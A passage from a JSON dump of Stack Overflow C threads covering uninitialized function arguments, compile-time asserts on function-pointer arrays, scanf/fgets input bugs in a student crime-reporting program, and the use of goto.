interpreted my question 100% correctly, and then gave a great answer, which works even when used in the real code (no, I&#39;ll not leave it there, but I wanted to test it)."}, {"owner": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "edited": false, "score": 0, "creation_date": 1524686738, "post_id": 50021619, "comment_id": 87077027, "body": "I&#39;ll accept this now, to curb the useless discussion. As I used the 2nd code sample (the <code>__asm__</code> one), I ask you to please switch the order and put it first. Thanks again."}, {"owner": {"reputation": 7053, "user_id": 1162141, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/7db6bfbfbb420620e6df76c0e406098d?s=128&d=identicon&r=PG", "display_name": "technosaurus", "link": "https://stackoverflow.com/users/1162141/technosaurus"}, "edited": false, "score": 0, "creation_date": 1525807972, "post_id": 50021619, "comment_id": 87499541, "body": "Would the &quot;=r&quot; constraint work when the calling convention uses the stack?  If not, would &quot;=g&quot; or &quot;=rm&quot; be better?"}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 7053, "user_id": 1162141, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/7db6bfbfbb420620e6df76c0e406098d?s=128&d=identicon&r=PG", "display_name": "technosaurus", "link": "https://stackoverflow.com/users/1162141/technosaurus"}, "edited": false, "score": 0, "creation_date": 1525832526, "post_id": 50021619, "comment_id": 87506797, "body": "@technosaurus: <code>=r</code> will work because the compiler will honor it\u2014it will choose a register, expect the assembly to put a value there, and will then use the value from there as it needs to (e.g., by moving it to the stack). However, <code>=rm</code> would be better, and so would <code>=x</code> (meaning any operand). I have updated the answer."}], "tags": [], "owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "is_accepted": true, "score": 6, "last_activity_date": 1525832676, "last_edit_date": 1525832676, "creation_date": 1524657051, "answer_id": 50021619, "question_id": 50020196, "link": "https://stackoverflow.com/questions/50020196/is-there-a-safe-way-to-specify-the-value-of-an-object-may-be-uninitialized-becau/50021619#50021619", "title": "Is there a safe way to specify the value of an object may be uninitialized because it is never used?", "body": "<h1>Using GCC/Clang `asm` Construct</h1>\n\n<p>In GCC and Clang, and other compilers that support GCC\u2019s extended assembly syntax, you can do this:</p>\n\n<pre><code>int *unused_ptr_arg;\n__asm__(\"\" : \"=x\" (unused_ptr_arg));\n\nreturn (*func)(unused_ptr_arg);\n</code></pre>\n\n<p>That <code>__asm__</code> construct <a href=\"https://gcc.gnu.org/onlinedocs/gcc/Extended-Asm.html\" rel=\"nofollow noreferrer\">says</a> \u201cHere is some assembly code to insert into the program at this point. It writes a result to <code>unused_ptr_arg</code> in whatever location you choose for it.\u201d (The <code>x</code> constraint means the compiler may choose memory, a processor register, or anything else the machine supports.) But the actual assembly code is empty (<code>\"\"</code>). So no assembly code is generated, but the compiler believes that <code>unused_ptr_arg</code> has been initialized. In Clang 6.0.0 and GCC 7.3 (latest versions currently at Compiler Explorer) for x86-64, this generates a <code>jmp</code> with no <code>xor</code>.</p>\n\n<h1>Using Standard C</h1>\n\n<p>Consider this:</p>\n\n<pre><code>int *unused_ptr_arg;\n(void) &amp;unused_ptr_arg;\n\nreturn (*func)(unused_ptr_arg);\n</code></pre>\n\n<p>The purpose of <code>(void) &amp;unused_ptr_arg;</code> is to take the address of <code>unused_ptr_arg</code>, even though the address is not used. This disables the rule in C 2011 [N1570] 6.3.2.1 2 that says behavior is undefined if a program uses the value of an uninitialized object of automatic storage duration that could have been declared with <code>register</code>. Because its address is taken, it could not have been declared with <code>register</code>, and therefore using the value is no longer undefined behavior according to this rule.</p>\n\n<p>In consequence, the object has an indeterminate value. Then there is an issue of whether pointers may have a trap representation. If pointers do not have trap representations in the C implementation being used, then no trap will occur due to merely referring to the value, as when passing it as an argument.</p>\n\n<p>The <a href=\"https://godbolt.org/g/oxYV89\" rel=\"nofollow noreferrer\">result with Clang 6.0.0 at Compiler Explorer</a> is a <code>jmp</code> instruction with no setting of the parameter register, even if <code>-Wall -Werror</code> is added to the compiler options. In contrast, if the <code>(void)</code> line is removed, a compiler error results.</p>\n"}, {"comments": [{"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 2, "creation_date": 1524692400, "post_id": 50025748, "comment_id": 87079567, "body": "This was addressed, essentially, in my answer. The IA64 NaT bits motivated the rule in c 2011 6.3.2.1 2 that using an uninitialized object can cause undefined behavior. However, as written in the standard, that rule applies only to objects that could have been declared <code>register</code>. By taking its address (so it cannot be <code>register</code>), we compel the compiler not to allow undefined behavior due to that rule. So a compiler for IA64 would have to avoid causing a trap due to that IA64 feature. But, with the same source code, compilers for other implementations could avoid initializing the object."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "reply_to_user": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 1, "creation_date": 1524700647, "post_id": 50025748, "comment_id": 87081876, "body": "@EricPostpischil The value could still be a trap representation . We could say that any representation not corresponding to a mapped address is a trap representation"}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1524702133, "post_id": 50025748, "comment_id": 87082236, "body": "@M.M: That is also addressed in my answer."}], "tags": [], "owner": {"reputation": 33990, "user_id": 14768, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/b6aMa.png?s=128&g=1", "display_name": "Joshua", "link": "https://stackoverflow.com/users/14768/joshua"}, "is_accepted": false, "score": 2, "last_activity_date": 1524699484, "last_edit_date": 1524699484, "creation_date": 1524669067, "answer_id": 50025748, "question_id": 50020196, "link": "https://stackoverflow.com/questions/50020196/is-there-a-safe-way-to-specify-the-value-of-an-object-may-be-uninitialized-becau/50025748#50025748", "title": "Is there a safe way to specify the value of an object may be uninitialized because it is never used?", "body": "<p>This is not actually possible across all architectures for a very good reason.</p>\n\n<p>A call to a function may need to spill its arguments to the stack, and in IA64, spilling uninitialized registers to the stack can <em>crash</em> because the previous contents of the register was a speculative load that loaded an address that wasn't mapped.</p>\n"}], "owner": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 248, "favorite_count": 1, "accepted_answer_id": 50021619, "answer_count": 4, "score": 5, "last_activity_date": 1525832676, "creation_date": 1524652884, "last_edit_date": 1524689619, "question_id": 50020196, "link": "https://stackoverflow.com/questions/50020196/is-there-a-safe-way-to-specify-the-value-of-an-object-may-be-uninitialized-becau", "title": "Is there a safe way to specify the value of an object may be uninitialized because it is never used?", "body": "<p>Disclaimer: The following is a purely academic question; I keep this code at least 100 m away from any production system. The problem posed here is something that cannot be measured in any \u201creal life\u201d case.</p>\n\n<p>Consider the following code (<a href=\"https://godbolt.org/g/6cF7Bb\" rel=\"nofollow noreferrer\">godbolt link</a>):</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>#include &lt;stdlib.h&gt;\n\ntypedef int (*func_t)(int *ptr); // functions must conform to this interface\n\nextern int uses_the_ptr(int *ptr);\nextern int doesnt_use_the_ptr(int *ptr);\n\nint foo() {\n    // actual selection is complex, there are multiple functions,\n    // but I know `func` will point to a function that doesn't use the argument\n    func_t func = doesnt_use_the_ptr;\n\n    int *unused_ptr_arg = NULL; // I pay a zeroing (e.g. `xor reg reg`) in every compiler\n    int *unused_ptr_arg; // UB, gcc zeroes (thanks for saving me from myself, gcc), clang doesn't\n    int *unused_ptr_arg __attribute__((__unused__)); // Neither zeroing, nor UB, this is what I want\n\n    return (*func)(unused_ptr_arg);\n}\n</code></pre>\n\n<p>The compiler has no reasonable way to know that <code>unused_ptr_arg</code> is unneeded (and so the zeroing is wasted time), but I do, so I want to inform the compiler that <code>unused_ptr_arg</code> may have any value, such as whatever happens to be in the register that would be used for passing it to <code>func</code>.</p>\n\n<p>Is there a way to do this? I know I\u2019m way outside the standard, so I\u2019ll be fine with compiler-specific extensions (especially for gcc &amp; clang).</p>\n"}, {"tags": ["c", "constants", "function-pointers", "assert"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 4, "creation_date": 1524650740, "post_id": 50019431, "comment_id": 87054874, "body": "And what <i>is</i> <code>C_ASSERT</code>? There&#39;s no such macro (which I assume it is) in standard C."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1524651928, "post_id": 50019431, "comment_id": 87055620, "body": "Please show a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>"}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1524656123, "post_id": 50019431, "comment_id": 87058209, "body": "Why do you <i>need</i> an assert?  You&#39;ve declared the array <code>const</code>, so nothing but <code>func1</code> can ever be in that position.  If you&#39;re worried that someone will change the code incompatibly, then that&#39;s a job for your unit tests (and good comments to explain <i>why</i> <code>callbacks[0]</code> must be <code>func1</code>)."}, {"owner": {"reputation": 485, "user_id": 1787061, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/061aff180f30fe1230b5c79cf49eaaa5?s=128&d=identicon&r=PG", "display_name": "elady", "link": "https://stackoverflow.com/users/1787061/elady"}, "edited": false, "score": 0, "creation_date": 1524656520, "post_id": 50019431, "comment_id": 87058515, "body": "I have added the expansion of the C_ASSERT to the question. I need it in order to prevent a change by mistake (by someone else). The example in the question is naturally minimized than the real code."}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 0, "creation_date": 1524725055, "post_id": 50019431, "comment_id": 87088885, "body": "I am voting to reopen. Selected duplicate is not accurate: <code>_Static_assert</code> would also not compile."}], "answers": [{"tags": [], "owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "is_accepted": false, "score": 0, "last_activity_date": 1524653632, "last_edit_date": 1524653632, "creation_date": 1524653171, "answer_id": 50020301, "question_id": 50019431, "link": "https://stackoverflow.com/questions/50019431/c-compile-time-assert-on-const-array-of-function-pointers/50020301#50020301", "title": "C Compile-Time assert on const array of function pointers", "body": "<p>You can't. Values of variables (<code>callbacks[0]</code> in this case) cannot be used in constant expressions in C. Not even if variable is declared <code>const</code>.</p>\n\n<p>You have to do either runtime assertion or check, or add big comment next to array definition saying <code>/* func1 must be first! */</code>.</p>\n"}], "owner": {"reputation": 485, "user_id": 1787061, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/061aff180f30fe1230b5c79cf49eaaa5?s=128&d=identicon&r=PG", "display_name": "elady", "link": "https://stackoverflow.com/users/1787061/elady"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 112, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1525191016, "creation_date": 1524650626, "last_edit_date": 1524656366, "question_id": 50019431, "link": "https://stackoverflow.com/questions/50019431/c-compile-time-assert-on-const-array-of-function-pointers", "title": "C Compile-Time assert on const array of function pointers", "body": "<p>I have this const array of function pointers:</p>\n\n<pre><code>const callback_t callbacks[] =\n{\n    func1,\n    func2,\n    func3,\n    func4,\n    func5\n};\n</code></pre>\n\n<p>and I would like to add C Compile-Time assert to ensure that func1 is placed first within the array.\nSomething like that:</p>\n\n<pre><code>C_ASSERT(callbacks[0] == func1);\n</code></pre>\n\n<p>after pre-preocessor stage this is expanded to:</p>\n\n<pre><code>extern char __C_ASSERT__272[( callbacks[0] == func1)?1:-1] __attribute__((unused))\n</code></pre>\n\n<p>but I'm getting compilation error:</p>\n\n<pre><code>error: variably modified '__C_ASSERT__272' at file scope\n</code></pre>\n"}, {"tags": ["c", "printf", "scanf", "fgets"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1524649753, "post_id": 50019046, "comment_id": 87054186, "body": "First of all, don&#39;t use <code>goto</code> and labels instead of loops."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1524649879, "post_id": 50019046, "comment_id": 87054289, "body": "Using both <code>fgets()</code> and <code>scanf()</code> in the same program leads to troubles.  Best to only use <code>fgets()</code>."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1524649886, "post_id": 50019046, "comment_id": 87054291, "body": "Secondly, you use the <code>%[</code> <code>scanf</code> format <i>wrong</i>. It&#39;s no <code>s</code> after it, that makes <code>scanf</code> want to match an actual <code>s</code> character in the input."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1524650079, "post_id": 50019046, "comment_id": 87054435, "body": "And <i>another</i> problem with your use of <code>scanf</code> and the <code>%[</code> format, is that <code>%[</code> is used to read <b><i>null-terminated strings</i></b>, and you provide single characters as arguments. That means <code>scanf</code> will write (at least) <i>two</i> characters to the memory starting with the character you provide. That writing out of bounds leads to <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\"><i>undefined behavior</i></a>."}], "answers": [{"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": true, "score": 0, "last_activity_date": 1524653068, "creation_date": 1524653068, "answer_id": 50020267, "question_id": 50019046, "link": "https://stackoverflow.com/questions/50019046/swapping-scanf-to-fgets-and-random-symbols/50020267#50020267", "title": "Swapping scanf to fgets and random symbols", "body": "<p>OP's code has various types of errors</p>\n\n<h3>Unneeded <code>s</code> in <code>scanf(\" %[^\\n]s\"</code></h3>\n\n<p>The <code>s</code> serves no purpose</p>\n\n<pre><code>// scanf(\" %[^\\n]s\", &amp;safe_place);\nscanf(\" %[^\\n]\", &amp;safe_place);\n</code></pre>\n\n<h3>Mixing <code>scanf()</code> with <code>fgets()</code></h3>\n\n<p>Use of <code>scanf(\" %[^\\n]\"...</code> consumes leading whitespace including prior <code>'\\n'</code> yet leaves any <code>'\\n'</code> after the text input in <code>stdin</code>.  <code>fgets()</code> reads up to <strong>and including</strong> the <code>'\\n'</code>. A <code>fgets()</code> right after <code>scanf(\" %[^\\n]\"...</code> will only read the prior input's left-over <code>'\\n'</code>.</p>\n\n<h3>Lack of width limitation</h3>\n\n<p>Buffer may readily overflow.</p>\n\n<pre><code>char first_name[20];\n// scanf(\"%s\", first_name);\nscanf(\"%19s\", first_name);\n</code></pre>\n\n<h3>Saving a <em>string</em> into a single <code>char</code></h3>\n\n<p><code>safe_place</code> needs a size of at least 2, one for the <code>'Y'</code> or <code>'N'</code> and the terminating <em>null character</em>.</p>\n\n<pre><code>// char safe_place;\nchar safe_place[10];\nprintf(\" Are you in a safe place? (Y/N)\\n\");\n// scanf(\" %[^\\n]s\", &amp;safe_place);\nscanf(\" %9[^\\n]\", &amp;safe_place);\n</code></pre>\n\n<h3>Scant error checking</h3>\n\n<p>Should unexpected data get entered, code does not verify for correct input, nor does it consume the errant input.</p>\n\n<pre><code>// scanf(\"%d/%d/%d\", &amp;incident_day, &amp;incident_month, &amp;incident_year)\nif (scanf(\"%d/%d/%d\", &amp;incident_day, &amp;incident_month, &amp;incident_year) != 3) {\n  Handle_Bad_Input_Somehow();\n}\n</code></pre>\n\n<hr>\n\n<p>Below is some alternative code to show reading a line and then using it.</p>\n\n<pre><code>int get_line(const char *prompt, char *dest, size_t size) {\n  printf(\"%s\", prompt);\n  fflush(stdout);\n  if (fgets(dest, size, stdin) == NULL) {\n    dest[0] = '\\0';\n    return 0;\n  }\n  dest[strcspn(dest, \"\\n\")] = '\\0';  // Lop off potential trailing '\\n'\n  return 1;\n}\n\nint main(void) {\n  char safe_place[10];\n  get_line(\" Are you in a safe place? (Y/N)\\n\", safe_place, sizeof safe_place);\n  if (safe_place[0] == 'N' || safe_place[0] == 'n') {\n    printf(\" Please contact the police Service immediately on 999\\n\");\n  }\n\n  char date[20];\n  int  incident_day, incident_month, incident_year;\n  do {\n    get_line(\" Please enter the date of the incident? (DD/MM/YY)\\n\", date, sizeof date);\n  } while (sscanf(date, \"%d/%d/%d\", &amp;incident_day, &amp;incident_month, &amp;incident_year) != 3);\n\n  char incident_address_house_no[20];\n  get_line(\" Please enter the House No.?\\n\", incident_address_house_no, \n      sizeof incident_address_house_no);\n\n  printf(\" Date of Incident       : %d/%d/%d \\n\", incident_day, incident_month,\n      incident_year);\n  printf(\" Street No. of Incident : %s\\n\", incident_address_house_no);\n  return 0;\n}\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user9696504"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 50, "favorite_count": 0, "closed_date": 1524680080, "accepted_answer_id": 50020267, "answer_count": 1, "score": -1, "last_activity_date": 1524653068, "creation_date": 1524649616, "question_id": 50019046, "link": "https://stackoverflow.com/questions/50019046/swapping-scanf-to-fgets-and-random-symbols", "closed_reason": "Not suitable for this site", "title": "Swapping scanf to fgets and random symbols", "body": "<p>I set a challenge to create a simple crime reporting system. I originally used scanf to input data but have transfered a few over the fgets which has causes multiple sections of printf to bunch without asking for an input. Also the report section at the end of the code prints random symbols and I can't figure out how to remove them. </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n\nint main ()\n{\n\nint  incident_day, incident_month, incident_year, incident_hour,     incident_minute, dd, mm, yy;\nlong long int contact_number, wit_contact_number[12];\nchar safe_place, CRS_qu, medical_qu, incident_address, incident_address_house_no[10], incident_address_street[10], incident_address_postcode[10], assailant_qu;\nchar assailant_name[20], assailant_address[40], wit_qu, wit_name[20], weapon_description[50], armed_qu[3];\nchar first_name[20], surname[20];\n\n\nstart:\nprintf(\" Are you in a safe place? (Y/N)\\n\");\nscanf(\" %[^\\n]s\", &amp;safe_place);\n\nwhile (safe_place == 'N' || safe_place == 'n')\n    {\n        printf(\" Please contact the police Service immediatly on 999\\n\");\n        break;\n    }\n\n\nprintf(\" This Crime Reporting System is for victims on assuault only, Are you a victim on assault? (Y/N)\\n\");\nscanf(\" %[^\\n]s\", &amp;CRS_qu);\n\nwhile (CRS_qu == 'N' || CRS_qu == 'n')\n    {\n        printf(\" Please select the appropriate Crime Reporting System related to the crime you want to report\\n\");\n        goto start;\n    }\n\nprintf(\" Have you had any medical treatment for any injurys sustained during the incident? (Y/N)\\n\");\nscanf(\" %[^\\n]s\", &amp;medical_qu);\n\nwhile (medical_qu == 'N' || medical_qu == 'n')\n    {\n        printf(\" Please contact the Ambulance Service on 999 and get imediate medical attention\\n\");\n        break;\n    }\n\nprintf(\" Please enter the date of the incident? (DD/MM/YY)\\n\");\nscanf(\"%d/%d/%d\", &amp;incident_day, &amp;incident_month, &amp;incident_year);\n\n\nstart2:\nprintf(\" Please enter an approximate time of the incident? Format 24:00\\n\");\nscanf(\"%d:%d\", &amp;incident_hour, &amp;incident_minute);\n\nif (incident_hour &lt;00 || incident_hour &gt;23 || incident_minute &lt;00 || incident_minute &gt;59)\n{\n\n    printf(\" Please enter a valid time in a 24:00 format\\n\");\n    goto start2;\n}\n\n\nprintf(\" Do you know the address of the incident? (Y/N)\\n\");\nscanf(\" %[^\\n]s\", &amp;incident_address);\n\nwhile ( incident_address == 'Y'|| incident_address == 'y')\n    {\n        printf(\" Please enter the House No.?\\n\");\n        fgets(incident_address_house_no, 10, stdin);\n\n        printf(\" Please enter the Street Name?\\n\");\n        fgets(incident_address_street, 10,  stdin);\n\n        printf(\" Please enter the Postcode?\\n\");\n        fgets(incident_address_postcode, 10, stdin);\n        break;\n    }\n\nprintf(\" Do you know the assailant? (Y/N)\\n\");\nscanf(\" %[^\\n]s\", &amp;assailant_qu);\n\nwhile ( assailant_qu == 'Y' || assailant_qu == 'y')\n    {\n        printf(\" Enter the assailants name?\\n\");\n        fgets(assailant_name, 20, stdin);\n\n        printf(\" Enter the assailants address?\\n\");\n        fgets(assailant_address, 40, stdin);\n        break;\n    }\nwhile ( assailant_qu == 'N' || assailant_qu == 'n')\n    {\n        printf(\" A detective will be incontact to get a description of the assailant\\n\");\n        break;\n    }\n\nprintf(\"Were there any witnesses to the incident? (Y/N)\\n\");\nscanf(\" %[^\\n]s\", &amp;wit_qu);\n\nwhile ( wit_qu == 'Y' || wit_qu == 'y')\n{\n    printf(\" Enter the witnesses name?\\n\");\n    fgets(wit_name, 20, stdin);\n\n    printf(\" Enter the witnesses contact number?\\n\");\n    fgets(wit_contact_number, 12, stdin);\n    break;\n}\n\nprintf(\" Was the assailant armed? (Y/N)\\n\");\nfgets(armed_qu, 3, stdin);\n\nwhile ( *armed_qu == 'Y' || armed_qu == 'y')\n{\n    printf(\" Please describe what the assailant was armed with?\\n\");\n    fgets(weapon_description, 50, stdin);\n    break;\n}\n\nprintf(\" \\nPlease enter yours details when prompted\\n\");\n\nprintf(\" \\nPlease enter your First Name\\n\");\nscanf(\"%s\", first_name);\n\nprintf(\" \\nPlease enter your Surname\\n\");\nscanf(\"%s\", surname);\n\n\nprintf(\" \\nPlease enter yours Date of Birth, format DD/MM/YYYY\\n\");\nscanf(\"%d/%d/%d\", &amp;dd,&amp;mm,&amp;yy);\n\n          if(yy&gt;=1900 &amp;&amp; yy&lt;=2018)\n    {\n        //check month\n        if(mm&gt;=1 &amp;&amp; mm&lt;=12)\n        {\n        //check days\n        if((dd&gt;=1 &amp;&amp; dd&lt;=31) &amp;&amp; (mm==1 || mm==3 || mm==5 || mm==7 || mm==8 || mm==10 || mm==12))\n            printf(\"Date is valid\\n\");\n        else if ((dd&gt;=1 &amp;&amp; dd&lt;=30) &amp;&amp; (mm==4 || mm==6 || mm==9 || mm==11))\n            printf(\"date is valid\\n\");\n        else if ((dd&gt;=1 &amp;&amp; dd&lt;=28) &amp;&amp; (mm==2))\n            printf(\"Date is valid.\\n\");\n        else if ((dd==29 &amp;&amp; mm==2 &amp;&amp; (yy%400==0 || yy%4==0 &amp;&amp; yy%100!=0)))\n            printf(\"Date is valid.\\n\");\n        else\n            printf(\"Date is invalid.\\n\");\n\n    }\n}\n\nmo:\nprintf(\"\\nEnter Contact Number +44\");\nwhile ( !scanf(\"%lli\",&amp;contact_number))\n{\n    fflush(stdin);\n    printf(\"\\n Invalid Contact Number:\\n\\n\");\n    printf(\" Enter Contact Number Again : \");\n}\nif (contact_number &lt; 1000000000 || contact_number &gt; 9999999999)\n{\n    printf(\"\\n Please Enter only 10 digits.....\\n\");\n    goto mo;\n}\n\n\nprintf(\" Victims Details\\n\");\nprintf(\" Full Name              : %s %s \\n\", first_name, surname);\nprintf(\" DOB                    : %d/%d/%d \\n\", dd,mm,yy);\nprintf(\" Contact Number         : +44%lld \\n\", contact_number);\nprintf(\" Witness Details\\n\");\nprintf(\" Full Name              : %s\\n\", wit_name);\nprintf(\" Contact Number         : +44%lln\\n\", wit_contact_number);\nprintf(\" Assailant Details\\n\");\nprintf(\" Full Name              : %s\\n\", assailant_name);\nprintf(\" Address                : %s\\n\", assailant_address);\nprintf(\" Incident Details\\n\");\nprintf(\" Date of Incident       : %d/%d/%d \\n\", incident_day,incident_month, incident_year);\nprintf(\" Time of Incident       : %d:%d\\n\", incident_hour, incident_minute);\nprintf(\" Street No. of Incident : %s\\n\", incident_address_house_no);\nprintf(\" Address of Incident    : %s\\n\", incident_address_street);\nprintf(\" Postcode of Incident   : %s\\n\", incident_address_postcode); \nprintf(\" Was the Assailant Armed: %s\\n\", armed_qu);\nprintf(\" Description of Weapon  : %s\\n\", weapon_description);\n\n\n\nreturn 0;\n\n}\n</code></pre>\n"}, {"tags": ["c"], "answers": [{"comments": [{"owner": {"reputation": 304, "user_id": 9307322, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e780c3bd3c1580381fe8b3abb66d2a7c?s=128&d=identicon&r=PG&f=1", "display_name": "abjoshi - Reinstate Monica", "link": "https://stackoverflow.com/users/9307322/abjoshi-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1524650034, "post_id": 50018852, "comment_id": 87054402, "body": "I agree this is true in this particular code since the error handling is rather simple, i.e. you can simply return. If the error handling was such that you had to do a couple of tasks before returning from each error, like freeing something, closing an fd etc., you would have to repeat that at each error. In that case, goto would have been much more readable.  Also, the purpose of the function is(since you said that it is hard to read): either use both compression and encryption or just one of them as dictated by the comp_enc flag."}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "reply_to_user": {"reputation": 304, "user_id": 9307322, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e780c3bd3c1580381fe8b3abb66d2a7c?s=128&d=identicon&r=PG&f=1", "display_name": "abjoshi - Reinstate Monica", "link": "https://stackoverflow.com/users/9307322/abjoshi-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1524650518, "post_id": 50018852, "comment_id": 87054720, "body": "@abjoshi I&#39;m not here for talking about good use case of goto, I perfectly aware of it, if you need an exemple, look <a href=\"https://stackoverflow.com/a/245761/7076153\">here</a>. But I talking of your code. And I think your code is a typical situation where goto is badly wrong, you ask me why, I&#39;m not good for talking, I prefer show code. And I show you it&#39;s perfectly possible without repeat code to not use goto in your case. I think I have nothing more to add that &quot;your gotos was useless&quot;."}, {"owner": {"reputation": 8833, "user_id": 337149, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/3bbd41f2b74254f902cfe20acef9030b?s=128&d=identicon&r=PG", "display_name": "August Karlstrom", "link": "https://stackoverflow.com/users/337149/august-karlstrom"}, "edited": false, "score": 0, "creation_date": 1524651628, "post_id": 50018852, "comment_id": 87055417, "body": "Provided that Stargateur&#39;s code is functionally equivalent, it wins over the original code since it is <i>much</i> easier to follow. It clearly shows the great advantage of structured 